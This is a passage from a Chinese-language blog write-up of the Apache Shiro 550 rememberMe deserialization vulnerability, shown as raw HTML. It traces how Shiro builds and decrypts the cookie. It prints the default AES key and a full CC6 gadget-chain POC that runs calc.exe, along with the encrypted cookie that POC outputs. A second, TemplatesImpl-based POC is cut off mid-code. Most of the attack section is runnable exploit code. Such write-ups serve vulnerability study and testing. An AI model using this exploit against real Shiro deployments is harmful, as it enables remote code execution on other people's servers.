class="comment">&lt;!-- SLF4J API --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.30<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- SLF4J Simple Implementation --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-simple<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.30<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- Servlet API (通常provided范围) --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul><li><strong>Shiro 1.x &lt; 1.2.5</strong></li></ul><h2 id="Shiro认证流程分析"><a href="#Shiro认证流程分析" class="headerlink" title="Shiro认证流程分析"></a>Shiro认证流程分析</h2><p>在Shiro550中，我们知道漏洞产生主要是由于内置了一个默认且固定的加密key，使我们可以伪造任意的remeberMe Cookie造成反序列化，那么我们在发送cookie时经历了什么呢？</p><h3 id="生成Cookie"><a href="#生成Cookie" class="headerlink" title="生成Cookie"></a>生成Cookie</h3><p>首先在<code>org.apache.shiro.web.mgt.CookieRememberMeManager</code>定义了一个常量来表示默认的Cookie名:</p><p><img src="/archives/2f569ddd/image-20250920153234944.png" alt="image-20250920153234944"></p><p>也就是remeberMe，接着看CookieRememberMeManager构造方法：<br><img src="/archives/2f569ddd/image-20250920153332498.png" alt="image-20250920153332498"></p><p>SimpleCookie类主要记录了Cookie的一些基本属性：<br><img src="/archives/2f569ddd/image-20250920153519170.png" alt="image-20250920153519170"></p><p><img src="/archives/2f569ddd/image-20250920153616404.png" alt="image-20250920153616404"></p><p>传入remeberMe将name设为remeberMe，CookieRememberMeManager构造方法得到了一个Cookie类型的cookie对象</p><p><code>org.apache.shiro.web.mgt.CookieRememberMeManager</code>主要定义了Cookie常量名并得到了cookie对象，我们向上探索在<code>org.apache.shiro.mgt.RememberMeManager</code>中找到了一些操作的方法：</p><p><img src="/archives/2f569ddd/image-20250920154250939.png" alt="image-20250920154250939"></p><p>其中onSuccessfulLogin似乎是登录成功后执行的操作，同时在这个接口实现类<code>org.apache.shiro.mgt.AbstractRememberMeManager</code>还发现了造成该反序列化漏洞的默认key：</p><p><img src="/archives/2f569ddd/image-20250920155106138.png" alt="image-20250920155106138"></p><p>并且该类重写了onSuccessfulLogin方法，跟进一下：</p><p><img src="/archives/2f569ddd/image-20250920154515038.png" alt="image-20250920154515038"></p><p>首先调用forgetIdentity方法清楚之前remeberMe的身份，随后看用户是否勾选了remeberMe，调用rememberIdentity方法：</p><p><img src="/archives/2f569ddd/image-20250920160153901.png" alt="image-20250920160153901"></p><p>调用了rememberIdentity的一个重载方法：</p><p><img src="/archives/2f569ddd/image-20250920160454321.png" alt="image-20250920160454321"></p><p>调用了convertPrincipalsToBytes方法，且bytes类型为数组类型类型对象，猜测该部分是设置Cookie的值，继续跟进：</p><p><img src="/archives/2f569ddd/image-20250920160852948.png" alt="image-20250920160852948"></p><p><img src="/archives/2f569ddd/image-20250920161209443.png" alt="image-20250920161209443"></p><p><img src="/archives/2f569ddd/image-20250920161241092.png" alt="image-20250920161241092"></p><p>调用了serialize对PrincipalCollection进行了序列化，将其转化为了字节数组</p><p>然后对字节数组进行<strong>加密</strong>，这里我们跟进看下加密逻辑：</p><p><img src="/archives/2f569ddd/image-20250920161602713.png" alt="image-20250920161602713"></p><p><img src="/archives/2f569ddd/image-20250920161833943.png" alt="image-20250920161833943"></p><p>先获取CipherService对象，在encrypt方法中，cipherService默认为AesCipherService对象。随后调用cipherService.encrypt方法</p><p><img src="/archives/2f569ddd/image-20250920162128190.png" alt="image-20250920162128190"></p><p>注意传入cipherService.encrypt方法中获取的key即是我们的默认key，最后会调用到org.apache.shiro.crypto.JcaCipherService类的encrypt方法进行了一次AES加密，这里就不跟了</p><p>我们再回到rememberIdentity抽象方法那，分析了如何转换成字节对象并加密后，接着还调用了<code>rememberSerializedIdentity(subject, bytes);</code>方法：</p><p><img src="/archives/2f569ddd/image-20250920163122568.png" alt="image-20250920163122568"></p><p>即会将我们的字节数组进行Base64编码保存在Cookie中</p><p>到这里Cookie生成的大致逻辑就差不多清晰了</p><h3 id="验证Cookie"><a href="#验证Cookie" class="headerlink" title="验证Cookie"></a>验证Cookie</h3><p>在我们第一次进行Shiro Web登录后，Shiro会将当前Subject信息保存在Cookie中。当我们发送一个Cookie时，那么Shiro必定对我们的Cookie进行验证，即执行与生成cookie相反的操作。也就是Shiro会对Cookie进行解码同时反序列化获取Subject的信息。既然这样，我们是否可以通过发送一个恶意的Cookie来造成反序列化漏洞呢？</p><p>一样的，先分析下Shiro验证Cookie的逻辑。</p><p>跳到<code>org.apache.shiro.web.mgt.CookieRememberMeManager</code>类的getRememberedSerializedIdentity方法：</p><p><img src="/archives/2f569ddd/image-20250920164039998.png" alt="image-20250920164039998"></p><p>这里会将我们的Cookie进行base64解码，随后按理说就是进行AES解密了，全局搜索getRememberedSerializedIdentity看哪里调用了该方法：<br><img src="/archives/2f569ddd/image-20250920164449598.png" alt="image-20250920164449598"></p><p>找到<code>org.apache.shiro.mgt.AbstractRememberMeManager</code>类中的getRememberedPrincipals调用了该方法：<br><img src="/archives/2f569ddd/image-20250920164708808.png" alt="image-20250920164708808"></p><p>其中这里的bytes就是经过base64解密后的Cookie值，随后会调用convertBytesToPrincipals方法：<br><img src="/archives/2f569ddd/image-20250920164743518.png" alt="image-20250920164743518"></p><p>这里就会对我们的Bytes进行解密并反序列化</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="初步尝试"><a href="#初步尝试" class="headerlink" title="初步尝试"></a>初步尝试</h3><p>通过分析Shiro的认证流程，我们是可以通过伪造一个恶意的序列化对象来造成反序列化漏洞了</p><p>我们可利用Shiro Web中的commons-collections依赖来构造payload来攻击Shiro Web应用，这里我利用的是CC6链</p><p>先构造恶意序列化对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] faketransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ConstantTransformer</span> <span class="variable">Runtime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">InvokerTransformer getRuntime=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">InvokerTransformer invoke=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">InvokerTransformer exec=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line"><span class="type">ConstantTransformer</span> <span class="variable">l</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;Runtime,getRuntime,invoke,exec,l&#125;;</span><br><span class="line">ChainedTransformer chain=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line"></span><br><span class="line">Map innermap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">Map Lazymap=LazyMap.decorate(innermap, chain);</span><br><span class="line">TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lazymap,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map.put(tiedMapEntry,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">innermap.remove(<span class="string">&quot;111&quot;</span>);</span><br><span class="line"></span><br><span class="line">Field field=chain.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(chain,transformers);</span><br><span class="line"></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">oos.writeObject(map);</span><br><span class="line">oos.close();</span><br></pre></td></tr></table></figure><p>进行AES加密：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AesCipherService aes=<span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line"><span class="type">byte</span>[] key=java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">ByteSource cipher=aes.encrypt(barr.toByteArray(), key);</span><br></pre></td></tr></table></figure><p>完整poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] faketransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">Runtime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        InvokerTransformer getRuntime=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer invoke=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer exec=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">l</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;Runtime,getRuntime,invoke,exec,l&#125;;</span><br><span class="line">        ChainedTransformer chain=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line"></span><br><span class="line">        Map innermap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map Lazymap= LazyMap.decorate(innermap, chain);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lazymap,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(tiedMapEntry,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        innermap.remove(<span class="string">&quot;111&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field=chain.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chain,transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(map);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        AesCipherService aes=<span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key=java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        ByteSource cipher=aes.encrypt(barr.toByteArray(), key);</span><br><span class="line">        System.out.printf(cipher.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tQyIfWf//mjgRVpbl1oORJdn0LjKmoHcVVSszWFSiOQJIqDUeb4QDy+4rijqZan7PuqpniXI0WAqsXZyAAGDZc7naStdCXunPZuNyHTgx/1yLFW/D0t96B/M/OVDOCkp5Hsye4OCFdnOmVxeWOwkQE/rVHP7l8QHzgZ5qFqCJ6gWGKNATXzBE1K6GdrSW8F3zgh89aHqvjL4bw8eek5bSK9dJY1End1Ymlz/fLO9FmGGVZJHgpj2s35qWtH6CFyzXO9g8IQhlAgvE6Bb286rPhL886HoJTtW2pGp01vRsHOr1qwzA5McfNHCcbPzQsRFZ0QZ8sfvH0GQpTH7GpFCI4rQOFzZ7DMzgwZIR+SKBKf+/d5oBi5r5K1WfQNVcYdVv1ywKPcVpQhSL1pHMQRP+ILJ0lbehqx5F2R0YJuLne979aAH6RXF64vBuWpX1IQQLgqQ545ndLTO/rh4jP6FfmYyZ4hV0yHyqMJMZ0SuB4xIsajJOaEPGBgaTctLc58u4OF1L0qIqxqkuL3aJhKkmvPu/xrjADZ6Rf3TLu4YZEuNKRn03+qTi/LFbelD4LX9abJ7j6K3wDlEzFqXhZtIZlX7Dq7/0EKRyG7lfTji2QmTqxWulYnQRP6COq0dExQb0oxB4njcp2rE/rASWMjt9uF8qdcx/Al0q30qOhCpWzv+vn5xrZZb7N0GrgT8y0LZxVFDcvN/gvJITZQ1IZOMMewo+uF2ECWblDDtiRF6FpCizpv0Q0rfr9PDQw0dCPWIK3hhZHO7nYHIaxs0yE2tqgWWOL81clj8a5z/gdPF9cAIpcp3ASEw++sXACSPzXwBZCzOqLvknqZquVItIwhgnEOWAtBNWQktWBCZlPEifpyQdLmCKFE8y0iKd0njsFG2za6j8LrlsBwmgqIzkXwjiF5Y5+q1mqzv1no8/Tsc2284lL6I918C/bedTj3wP2dbgrd3XfdIcpk37MhiW6LSeUOXrXEq7j2QkVneatL+dtsRKw+ZLoZvagLeohzoKeY0L3SkqFjtEdkvgVgbmKQQ84TlMpNUjUHhmMo4EGyAc6vTF7Y6ogZi1FCN+SunUCvl4B4FaSQWp9Vb1ZRwDSTNxpqbTtHRnQ5aoAESY5uTWiBvWSayPzeLApobhnGn4Jf5NNsbjB7/MoBGugD/4mS3pr3kW5qWbOMQpePk30pFERrmcOC0GNMfY/W1C8qEVJCP1BZJRV3f2i6Z3fYbtCxui5w9QiqECnv0HWTcle6ywv9a0hScMBLtLnD+wi/FBsVo5skVZB9xczmnNaBtQmPI8jnBqN1ObTA8zvCSJPM4hpQiTo1eQSqZJUGM2Nbargtz8os4OlyDGjCx6mCEclbDoPKQz3jabaR/Zk2PLAEBo7SGd5DCk/hze/Bjil2vfICMcEMeQpaJKoL+C2G8aDbmVA1S5wY+tVCMWMsTMgziayFltLXfzMxDNOZsEFJoollwJ2t31z4quvakG7W/OfTHWwdU2/PGztuEUDsCzCH3b3lyAeRBqBRR55+WayAmyU25EBRNuzleznJTM1znmHawR+oJtb/g1vFrvHPH8jxHDyxWLRw1xSfHbnNQiRbllxQK5Us0igulF8BQkH2sJZgAIVqRdxxTh4hTx0ZMEJZkpjOuUOO4+kF/jNP0bs8tK51kfOep5JBK/ioep/7L24TQoA==</span><br></pre></td></tr></table></figure><p>把输出的内容当作remeberMe的值发送，结果报错了：<br><img src="/archives/2f569ddd/image-20250920212056291.png" alt="image-20250920212056291"></p><p><img src="/archives/2f569ddd/image-20250920212114059.png" alt="image-20250920212114059"></p><p><img src="/archives/2f569ddd/image-20250920212133770.png" alt="image-20250920212133770"></p><p>三个问题：</p><ul><li>无法反序列化字节数组参数</li><li>无法加载<code>ObjectStreamClass [[Lorg.apache.commons.collections.Transformer;: static final long serialVersionUID = -4803604734341277543L;]</code></li><li>无法从线程上下文、当前或系统应用程序类加载器加载名为 <code>[[Lorg.apache.commons.collections.Transformer;] </code>的类。所有启发式都已用尽,找不到类。</li></ul><p>从源码入手，定位到org.apache.shiro.io.DefaultSerializer类：<br><img src="/archives/2f569ddd/image-20250920214343053.png" alt="image-20250920214343053"></p><p>在这就会抛出一个异常说无法反序列化字节数组参数</p><p>这里实例化了一个ClassResolvingObjectInputStream类，该类继承了ObjectInputStream类。</p><p>该类重写了resolveClass方法，该方法主要用于根据序列化数据中的类描述信息解析并加载对应Java类</p><p><img src="/archives/2f569ddd/image-20250920215502879.png" alt="image-20250920215502879"></p><p>如果加载失败会抛出ClassNotFoundException异常即第二个报错对应的情况</p><p>而在ClassUtils.forName方法中，clazz为null，会抛出UnknownClassException异常，即第三个报错的内容</p><p><img src="/archives/2f569ddd/image-20250920220118727.png" alt="image-20250920220118727"></p><p>在ClassResolvingObjectInputStream类的resolveClass方法中，利用了ClassUtils.forName方法来获取Class对象</p><p>其中fqcn为<code>[Lorg.apache.commons.collections.Transformer</code>，这里的<code>[L</code>是JVM的标记，表示是一个数组，即<code>Transformer[]</code>，随后通过<code>loadClass</code>方法来获取Class对象，而非Class.forName方法</p><h3 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h3><p>既然不能使用Transformer[]数组，那么这里我就想着是否能用CC2的部分思路来加载恶意字节码，因为CC2是没有用Transformer[]数组的，如果版本允许可以直接用CC2</p><p>因为我们需要调用的是TemplatesImpl.newTransformer方法</p><p><img src="/archives/2f569ddd/image-20250921152959247.png" alt="image-20250921152959247"></p><p>在CC2中，是通过给tansformer传值为InvokerTransformer同时obj1传入TemplatesImpl对象实现加载字节码的</p><p><img src="/archives/2f569ddd/image-20250921152329124.png" alt="image-20250921152329124"></p><p>而在LazyMap.get方法中，虽然前面poc不一样，但后面思路一样的，我们同样可以利用InvokerTransformer.transform(TemplatesImpl)来执行TemplatesImpl.newTransformer方法，即：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, invokerTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, Impl);</span><br><span class="line">map.put(e, <span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">outerMap.clear();</span><br></pre></td></tr></table></figure><p>完整POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes= Base64.getDecoder().decode(<span 